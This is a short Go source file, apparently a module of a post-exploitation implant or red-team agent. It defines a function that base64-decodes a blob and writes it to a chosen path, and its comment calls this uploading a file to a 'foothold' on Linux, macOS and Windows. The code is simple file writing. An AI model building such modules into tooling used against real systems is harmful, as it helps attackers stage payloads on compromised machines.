// +build linux darwin windows

package biterpreter

import (
    "io/ioutil"
    "encoding/base64"
)


/*
Description: Upload File to Foothold --> Linux,Darwin,Windows.
Flow:
A.Write parameter string into a file on target PATH
*/
func Upload(target string,blob string) (bool,string){
    
    decoded, err := base64.StdEncoding.DecodeString(blob)
	if err != nil {
		return true,"Error b64 decoding blob: "+err.Error()
	}

    err = ioutil.WriteFile(target, []byte(decoded), 0666)
    if err != nil {
        return true,"Error Writing File: "+err.Error()
    }

    return false,"File Uploaded"
}